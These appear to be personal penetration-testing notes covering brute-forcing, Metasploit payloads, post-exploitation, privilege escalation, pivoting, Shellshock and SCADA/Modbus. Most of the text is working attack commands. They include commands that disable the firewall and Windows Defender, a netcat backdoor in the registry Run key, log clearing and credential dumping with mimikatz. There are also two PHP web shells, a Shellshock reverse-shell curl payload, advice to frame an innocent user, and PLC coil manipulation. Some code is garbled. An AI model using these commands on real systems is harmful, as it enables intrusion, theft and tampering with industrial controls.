	* We need to frequent the lists that are full disclosure.
		[SecList Full Disclosure](http://seclists.org/fulldisclosure)
	* Location of the attacker.
		* Remote is preferred.
		* Local can be used for internal testing or when we gain access via a remote vector. ;)
	* Are exploits available.
		* Is it in a framework or have to build the code.
	* Impact of the exploit.
		* Denial of service are not much use.
	* Complexity
* Location 
	* Remote
		* Network is reachable - As mentioned is ideal.
	* Local
		* Physical
			* At the host machine.
	* Subnet
		* Present on the same subnet (man in the middle).
	* Intranet
		* Inside the internet firewall.
		
* Complexity
	* Coding skills.
		* C
		* Java
		* PhP
		* others
	* State.
	* Decryption or decoding required.
* Authentication
	* Is it required.
	* Data Analysis should reveal potential password attack vectors.
		* SSH
		* SMB
		* RDP
	* Most web apps need authentication.
* Quick questions:
	* Have you ever configured a a router and made a mistake.
	* We can always get access because of admin errors.
	* Services can be brute forced.

##  <a name="5.3"></a>5.3 Remote Password Attack
* Hydra is the tool of choice 
	* Can attack most of the desired services
	* `hydra -e nsr -L sqlmap.txt ip_address ssh -t 4`
	* `hydra -l username -P rocku.txt ip_address <protocol>`
	* `hydra -l username -P roockyou.txt ip_address <protocol>`
* Patator
	* `patator ssh_login host=ip_address user=root password=FILE0 0=/rocku.txt`
	* `patator ssh_login host=ip_address user=username password=FILE0 0=rockyou.txt`
	
* Ncrack (Faster)
	* `ncrack -v --user sys -P /rocku.txt ssh://ip_address`

* Medusa `parallel and fast]
	* `medusa -h ip_address -u root -P rocku.txt -M ssh`
		* -U = use a file

	* `medusa -h ip_address -u administrator -P rocku.txt -M rdp`

* Rdesktop
	* We can see the remote desktop using this command.
		* `rdesktop -u administrator -p password ip_address`
* Whatweb	
	* `whatweb http://ip_address`(Tells about the cms or tech used by the domain)
* wp_scan
	* `wpscan --url http://<ip_address> --enumerate u`
	*  Find the vulnerability
		* `wpscan --url http://<ip_address> --enumerate vp`
	* Example:
		* After finding the vulnerabilities
			* `use exploit/name`
			* `set RHOST <victim ip address>\r`
			* `set TARGETURI /<directory>\r`
			* `exploit`

* WebShell
	* b374k Shell 
		* `php -f index.php -- -o myshell.php =p password --ess -c 9`
		* Upload the file.
		* `nc -l -v -p 13123`
		* `server run php` 

##  <a name="5.4"></a>5.4 Exploit framework
* Metasploit
	* Scanning auxiliary modules for webapps.
	* ` db_nmap -A ip_address`
	* ` services -p 22`
	* ` search exploit`
	* ` nikto -h ip_addres`
	* ` use exploit/name`
	* ` show options`
	* ` set RHOST`
	* ` set RPORT`
* Canvas
* CoreImapact

* Armitage/cobalt strike {Ultra Crazy Tool}.
	* Detect OS.
	* attack -> Find attack search exploit for exploit and hail marry for every possible exploit.

##  <a name="5.5"></a>5.5 Payload
* There are extensive number of payloads.
* Meterpreter shellshock.
	* Ability to grab password files.
	* Might not be successful.
	* When the payload fails.
		* Select another.
			* Generic bind shell is usually easiest.
* Shell Options
	* change port from 4444.
	* Change it to something else.
		* NTP
			* `123`
	* Want a port that is not proxied and can egress out.
		* Makes 80 etc. bad choices in most cases
	* `set lport 123, 80 , 8080`
	* `Required` 

* SET
	* setoolkit (without going FUD)
	* `->	4 ->  1 ->LHOST -> PORT`

* Compromise the victim.
* Use discovered or likely vulnerabilities.
* Employ a valid vector.
* Deliver the payload.
* Once the victim is compromised, what should happen?
	* Additional enumeration.
		* Pilfering.
* From this point of access.
* Footprint and enumerate other systems.
* Remember the rules of engagement.
* Perform local assessment.
	* `netstat -an`
	* `net start`

#  <a name="6.0"></a>6 Post exploitation
## <a name="6.1"></a>6.1 Goals:
* Identify the procedure for exfiltrating data after initial compromise.
* Explore privilege escalation on different platforms.
* After getting shell.
* Crack passwords.
* Escalate privileges if required.
* Plant backdoor - if allowed by scope .
* Conduct local assessment.
* Disable firewall
	* Local firewall can cause challenges, so best to disable it.
	* PS: `netsh firewall set opmode disable`

* Disable Windows defender
	* PS:`net stop "Windows Defender Antivirus Network Inspection Service"`
	* PS:`net stop "Windows Defender Antivirus Service"`
	* PS:`net stop "Windows Defender Security Center Service"`
	* Depending on the OS and your level of access, the commands might not all work.

* killav script

##  <a name="6.2"></a>6.2 Local assessment
* Ipconfig.ifconfig
* Ping
* Nslookup
* Nbstat
* netstat -ano
* Linux.
	* netstat -vauptn
	* lsof
* Machines that are reachable.
	* `arp -a`
* Windows net commands for locating shares and disabling protections.
* FTP and T-FTP bring in your addition tools.
* TELNET for banner grabbing in the local intranet.
* Check for utilities(especially in Linux).
* Route Print.
* This will display the routing table of our computer; the netstat -r command can also be used for this.
* Running services
	* tasklist/svc
* Netsh
	* netsh firewall set opmode disable.
* If we have "meterpreter shell".
* Prints information about all the running desktops.
	* `enumdesktops`
* Can migrate to a more and higher privilege process.
	* `migrate`
* Will attempt to escalate privileges by all methods available.
	* `getsystem`
* Will attempt to bypass UAC -fails on newer Windows machines.
	* `bypassuac`
* Valid impersonation token of a specific user, say administrator to impersonate that user without any authentication.
	* `incognito`
* List the available tokens for impersonation.
	* `list_tokens -u`
* Install backdoor.
* If allowed in the scope install netcat.
	* first kill the antivirus.
		* killav
	* `upload/usr/share/Windows-binaries/nc.exe C:\\Windows\\system32`
* Setup the backdoor at boot
	* `reg setval -k HKLM\\software\\microsoft\\Windows\\currentversison\\run -d 'C:\Windows\system32\nc.exe -LDP 4444 -e cmd.exe' -v netcat`
* Windows Targets
* Enable remote desktop
	* `run getgui -e`
* Add users for RDP.
	`run getgui -u username -p password`
* Testing our access
	`rdesktop -u username -p password <ip_address>`
* Grab the data.
* `run winenum`
* `run post/Windows/gather/credentials/credential_collector`
* Recent files
	* `run post/Windows/gather/dumplinks` 
* `run post/Windows/gather/credentials/enum_applications` (check install apps)
* `run post/Windows/gather/credentials/local_exploit_suggester`
* `run post/Windows/gather/usb_history`
* `run event_manager -i`
* `run event_manager -c` (clear the logs)
* We can use mimikatz to extract the passwords from our targets as well when 
	* `load mimikatz`
* hashdump does not work.
* load mimikatz.
* kerberos.
* WMIC commands.
* List processes.
	*` wmic process list brief`
* Start an application.
	`wmic process call create "calc.exe"`
* Get list of process identifiers.
	`wmic process where (Name='scvhost.exe') get name, processed`
* Find a specific process.
	`wmic process list brief find "cmd.exe"`
* Collect environment variables.
	`wmic environment list`
* OS/System Report HTML Formatted.
	`wmic /output:c: OS.html OS get /format:hform`
* Turn on remote desktop remotely.
	`-wmic /node:"servername" /user:"user@domain" /password: "password" RDToggle where Server Name = "server name" call SetAllowTSConnections 1`
* Get startup list.
	`wmic startup list full`
* Collect a list of groups on the local system.
	`wmic group list brief`
* System accounts.
	`wmic sysaccount list`
* Shares list.
	`wmic shares list`

##  <a name="6.3"></a>6.3 Escalating privileges
* When we get the shell we might not be at admin or root level privileges.
* We have to escalate out privileges to take more control of the machine
* Techniques we will discuss.
	* Wmic.
	* UAC bypass.
	* Linux privilege escalation.
* meterpreter
	* getsystem -just
	* `run poost/Windows/escalate/bypassuac`
	* For impersonation.
		* `use incognito`
	* Example impersonate administrator
		* `impersonate_token machine_name\\Administrator`
* WMIC analysis.
	* We can use this to identify the patch level of the compromised machine
		* Windows 7 and later targets.
	* Look at hte installed KB numbers and from there analyze any vulnerabilities b using the findstr command.
	* If nothing comes up than the patch is missing.
		* `wmic qfe get Caption,Description,HotFixID,InstalledON | findstr "KB3139914"` 

* findstr
	* If output is returned then the patch is installed than look for another one.

* Privilege escalation with dirty Cow.
	* A local privilege escalation against Linux.
	* Once we have a shell we can attempt to escalate privileges.
	* Code is buggy but sometimes work.
	* if you have later than ubuntu 15 Dirty cow might be the way to go.

##  <a name="6.4"></a>6.4 Linux privilege escalation
* Ubuntu 16.04 privilege escalation bpf.
	* `use exploit/Linux/local/bpf_priv_esc`

* `serarchsploit privilege`
* `searchsploit Linux kernel 2.6 privilege`
* `use exploit ssh_login and collect the information`
* Use information after selecting  the exploit.

* Ubuntu 12-15
	* overlayfs privilege escalation
		* ` use exploit/Linux/local/overlayfs_priv_esc`
	* Determine the kernel version
		* `uname -a`
	* Return additional information about the machine.
		* `cat /etc/lsb-release`

* Initial Access
	* Brute force an ssh login is most common methodology.
	* Hydra.
	* Metasploit.
		* Auxiliary scanner
			* `auxiliary/scanner/ssh/ssh_login`
			* Attempt to escalate the privileges.
				* `->create session -> overlayfs` 

## <a name="6.5"></a>6.5 Windows privilege escalation.
* Search for data in Windows shell

	* `dir /s *pass* == *cred* ==*vnc*==*.config* | more`
	* `findstr /si password *.xml *.ini *.txt`
	* `reg query HKLM /F password /t REG_SZ /s`
	* `reg query HKCU /f password /t REG_SZ/s`

* Unattended files
	* `c:\sysprep.inf`
	* `c:\sysprepsysprep.xml`
	* `%WINDIR%\Panther\Unattend\Unattended.xml`
	* `%WINDIR%\Panther\Unattend.xml`
##  <a name="6.6"></a>6.6 Files of interest
* Services\Services.xml
* ScheduledTasks\ScheduledTasks.xml
* Printers\Printers.xml
* Drives\Drives.xml
* DataSources\DataSources.xml

* Shell Limited
	* Try and spawn a bash shell
		* `python -c 'import pty;pty.spawn("/bin/bash")'`
		* `echo OS.system('/bin/bash')`
		* `/bin/sh -i`

* Sticky Bits
	* Only the owner of the directory or the owner of a file can delete or rename.
		* `find / -perm -1000 -type d 2>/dev/null`
		* Run as the group not the user who started it
			* SGID(chmod 2000) - 
		* `find / -perm -g=s -type f 2>/dev/null`
		* `find / -perm -u=s -type f 2>/dev/null`
		* `SUID (chmod 4000) -run as the owner not hte user who started it`
* Written to and executed from.
	* `find / -writable -type 2>/dev/null`
	* `find / -perm -222 -type 2>/dev/null`
	* World writeable folders.
		* `find / -perm -o w -type 2>/dev/null`
	* World executable folders.
		* `find / -perm -o x -type 2>/dev/null`
	* World-writeable and executable folders.
		* `find / \(-perm -o w -perm -o x\) -type 2>/dev/null`

## <a name="6.7"></a>6.7 Dev tools aftermath
* What development tools are on the compromised machine ?
	* `find / -name perl`
	* `find / -name python`
	* `find / -name gcc`
	* `find / -name cc`

##  <a name="6.8"></a>6.8 File transfer
* If we have a meterpreter shell then we can transfer files, if not then we need to find what is available.
	* `find / -name wget`
	* `find / -name nc*`
	* `find / -name netcat*`
	* `find / -name tftp*`
	* `find / -name ftp`

## <a name="6.9"></a>6.9 User/Group account evasion
* With a for loop in the Windows command shell, we can combine "wmic" and "net-user" to get extended information about all the users on the system.
	* `-for /F "skip=1" %i in ('wmic useraccount get name') do net user %i >> users.txt`
* Groups
	* `-for /F "delims=* tokens=1 skip=4" %i in ('net localgroup') do net localgroup %i >>groups.txt`

* Powershell Script to transfer a file.
	* Start the web server on the attacker machine.
		* `service http2 start`
	* `echo $client = New-Object System.Net.WebClient > script.ps1`
	* `$client.DownloadFile($targetlocation,"psexec.exe")`
	* Execute the script.
		* `powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1`

	* Example:
		* Network services version check.
			* `nmap -sV ip_address` 
		* Nessus -> Basic network scan.
		* `nmap -sC ip_address`
		* If there is a web server navigate via browser. -> use dirbuster .
		* Maintain the excel sheet.
		* Scan with vega.

	* Task Add a user and  Task transfer a file using sqli

	* atftpd
		* `atftpd --daemon --port port_no --bind-address ip_address /tmp`
		* Or use any other folders

	> Always tftp server to own the system

	* tftp
		* `ascii`
		* `connect`
		* `tftp -i ip_address PUT runsnort.bat`

	* Install backdoor
		* `netcat on`
		* `upload /usr/share/nc.exe c:\\`
		* `nc -L -p 9007`
	* meterpreter
		* `run getgui -u username -p password`
		* `rdesktop -u username -p password`

	* netstast | grep port_number
	* hashduump to see the administrator password using meterpreter
	* `migrate`
	* `run winenum`

## <a name="6.10"></a>6.10 Exploit suggestion
* In meterpreter shell 
	* ` run post/multi/recon/local_exploit_suggester`

## <a name="6.11"></a>6.11 Writing base64 encoded rat

# <a name="7.0"></a>7. Evasion
* Rarely asked for today.
* Simple unplanned attacks may be successful but are soon detected and stopped.
## <a name="7.2"></a>7.1 Evading defensive system
* Defenses and detection are almost always present.
	* Firewall
	* IDS/IPS
* Defenses and detection always have flaws.
## <a name="7.2"></a>7.2 Cover your tracks
* Remove logs
	* Mangle if unable to remove.
* Frame a user
	* Put files within the user profile.
* I want to recommend to read psychological operation at this point of evasion.

# <a name="8.0"></a>8. Advance tips and tactics
	
# <a name="8.1"></a>8.1 Goals:

* Review the concepts of pivoting.
	* We will encounter networks that are not visible from our attacking machine
	* We will need to exploit a machine that is dual homed and connected to another network.
	* This reaching new networks from the original or first victim is known as pivoting.
	
	* Trust:
		* Ince we compromise the first victim we improve our position within the network. The results of compromising the first victim are:
			* Having direct routing to the new victims.
			* Store usernames and passwords.
			* Allow for footprinting, enumeration and compromising of new victims.
	
	* Preparation
		* Dual homed machines are common.
		* Have a plan for when you encounter the machines.
		* The longer the attack is ongoing the higher the risk of detection.
		* Imperative that the attack is scripted as much as possible.
			* saves time and avoid typos.
		* Remember your scope of work.
			* Off limits areas and rules of engagement.
	
	* New attack
		* Routing will be required.
		* The victim machine will not have the exploits and payloads that you need to attack the next network and or machine .
		* Three methods for the attack.
			* Download the utilities to the victim and run from the shell.
			* port forwarding.
			* session routing.
			* Run from the Shell.
				* We use upload command in meterpreter.
				* Alternatively we can ftp or tftp the code over and then install it.
				* Have to disable protections in most cases.
				* least desired method.
			* Port Forwarding
				* Redirect connection for a port on the first victim to another host.
				* Useful when
					* We have a firewall still between the first compromise and the inside net.
					* Direct routing to the first victim is available.
					* Source of the attack is now the address of the first .victim and not us.
			* Session Routing
				* Attacker sets up routing to send attacks through the initial victim and on to the next ones.
					* The attacks are in effect tunneled to the first victim.
					* Source address of new attacks is the first victim.
					* Initial victim acts as an exploit proxy.
				* If we to add the route from second machine on the network than:
					* In meterpreter this is easy
					* `run autoroute -h`
					* `run autoroute -s ip_address`
					* `run autoroute -p `
					* Meterpreter
						* `run post/multi/manage/autoroutee SUBNET=192.168.40.0 ACTION=ADD`
						* `run post/multi/manage/autoroute option=p`
					* Search the discovered network.
					* Can use a variety of post modules in Metasploit.
					* OS discovery 
						* An smb_version discovery scanner
							* `auxiliary/scanner/smb/smb_version`
					* Exploit through the session
						* Same process since we have the route set up.
					* Double Pivot
						* The process is the same as covered.
						* Access a machine via the fist victim and then on the 2nd victim discover the two network cards.
						* The 2nd network card represents the next network to  attack and in a sense this is a double pivoting.
## <a name="8.2"></a>8.2 Creating and using proxychains
* Proxy chains
	* Sometimes we need to remain untraceable while performing a penetration test activity. Proxychains helps us by allowing us to use an intermediary system whose ip can be left in the logs of the system without the worry of it tracing back to us.
	* We can setup a proxy via the tor network or a socks implementation
	* Steps to setup.
		* Modify the configuration file for our proxychains.
			* `/etc/proxychains.config`
		* Can run any command through the proxy.
			* Can setup proxy for tor as well as socks, http etc.
		* Metasploit proxy modules.
			* `use auxiliary/server/socks4`
	* Usage
		* Once you have set the proxy all commands can be used through it using proxychains through the port that you have setup.
			* `proxychains nmap -sT ip_address`
## <a name="8.3"></a>8.3 Explore web shells
* Web Shells
	* Malicious script used by an attacker with the intent to escalate and maintain persistent access on an already compromised web application.
	* Persistent Remote Access.
		* A web-shell usually contains a backdoor which allows an attacker to remotely access and possibly control a server at any time.
	* A web-shell can be used for pivoting inside or outside a network.
		* b374k is of one kind and check the create shell in previous chapter.
		* Weevely (brute force sql and many more).
		* Creating a custom shell.
			* Requires command execution.
			* Form handling.
			* Conditionals.
			* Focus.
			###  Example
			* First create a form with post and submit.
			### Php form
				<?php
					if($_POST['command'])
					{
						if($_POST['out']."\n";{
							if(stren($out)>2000)
							{
								$out=substr($out,strlen($out,strlen($out) - 2000,2000);
							}
						}
						$out.=">($_POST['command'])\n";
						exec($_POST['command'],$data);$out.=implode("\n",$data);
					}
				?>
				
			
			
			### Basic php shell
				
				<html>
				<head>
				<title>Simple PHP Shell</title>
				</head>
				<body>
				<form action="shell.php" method = post>
				<input type ="text" name="c"/>
				<input name="submit" type=submit value="command">
				</form>
				<?php
					if(isset($_REQUEST['submit'])){
						$c=$_REQUEST['$c']
						$output = shell_exec("$c");
						echo "<pre>$output</pre>\n";
					}
				?>
				</body>
				</html>

## <a name="8.4"></a>8.4 Scanning  against defenses
* `nmap -sS ip_address`
* `nmap -sS ip_address`
* `nmap -sC ip_address`
* When their is filter applied.
	* Than go to wireshark.
	* And use filter [TCP.flags.syn ==1 and TCP.flags.ack == 1]
* `iptables -A INPUT -J REJECT --reject-with-icmp-host-prohibited`
* CISCO router
	* apt get install dynagin.
	* get the cisco ios.
* Source port scanning
	* `nmap -sS ip_address -Pn` 
	* Active ftp
		* 20
	* `nc -p 20 ip_address port_number`
	* wrieshark -> TCP.port == 20 ->capture 
	* `nmap -g 20 -sS ip_address/range` 
		* g=source port
	* Services scan
		* `nmap -g 20 -sV ip_address 
	* `nmap -sS ip_address -Pn`
	* `nmap -g 20 -A ip_addresss`
	* Check Metasploit if it has the exploit sometime it don't find the option.
	* `show advanced option`
	* `set CPORT 20`
	* `set LPORT 123`
	* If you get session try change payload
	* `rexploit`
	* Try restart the OS
	* `c:\>netstat -rm`

* Low balancing
	* [Netcraft](netcraft.com)
	* `hping3 -S domain_name -p port_number`
	* `arp -a`
	* `lbd domain_name`
	* `wafw00f domain_name`
	* `obfuscation`
		* `hackbar`
* SET tool
	* 9 - powershell attack vector
	* l for numeric shellcode
	* `ip_address`
	* `set port`
	* turn off firewall using script
	* `run in powershell\`
	* and session -i 1 in meterpreteer
## <a name="8.5"></a>8.5 Pivoting
* `run autorout -s ip_address`
* `run autoroute -packet`
* Search for subnet
	* `run /exploit/auxilary/arp_scanner` 
* Searching for next machine
	* `search smb version`
* `set RHOST ip_address`
* `set threads 50`
* `run`
* And wait
* Here in this scenario we have tikiwiki vulnerability 
	* `search tikiwiki`
* `use exploit/unix/webapp/tikiwiki_graph_formula`
* `set Rhost and port`
* `search ms17-010`
* `search ms08_067`	
* Proxychains 
* `vi /etc/proxychains.conf` 
* `search socks`
* `use auxilary/socks4a`
* Stealth search
	* `proxychains nmap -sT ip_address.

##  <a name="8.6"></a>8.6 Exploiting shellshock
* `nmap -sS ip_address`
* `nmap -sV ip_address`
* `nikto -h ip_address -c all -o nikto.results.html | grep cookies(c=cgi.bin directories)`
* `web browser -> ipaddress/cgi-bin/printenv (shellshock) runnigscript using html`
* `nc -l -v -p 123`
* `curl -H ""User-Agent: {} {:;}; /bin/nc -e /bin/sh "ip_address" httpp://* ip_address/chi-bin/printenv`
* `so we can run python script`
* `python -c "import pty; pty.spawn('/bin/bash')"`
* `./etc/profile`
* `cd /tmp`
* `nc ip_address > cowroot32 (download dirty_cow)	`		
* `nc - l -v -nn -p 123`
* `cd /tmp `
* `chmod +x cowroot32`` 
* Put the python shell against.
* Run the  ./cowroot32 in python environment in victim machine
## <a name="8.7"></a>8.7 SCADA evasion.
* ` nmap -sP ip_address/range`
* To check the port
	* ` nmap -sS ip_address` 
* Check the port what is running on that port; just see the attack surface
	* ` nmap -sV -p 10000 ip_address` 
* ` nmap -sC ip_address
* Check enumeration using check.
* Most iot have default password.
## <a name="8.8"></a>8.8 ICS/SCADA modbus protocol
* Ping sweep
	* ` nmap -sP ip_address `
* `nmap -sS ip_address,second_ip`
* `Metasploit >> Search modbus`
* `see the modules`
* `set auuxilary/scanner/scada/modbusclient`
* see options and see the port
* `set UNIT_ID_TO 12`
* `set RHOSTS ip_address`
* `run`
	* manipulating the plc means we are manipulating the control
* `set UNIT_NUMBER 8`
* `set RHOSTS ip_address`
* We can turn on off and many things.
* `set ACTION READ_COILS`


Happy Hacking {(-_-)}

> Only for eductional purposes: Psyrun













































































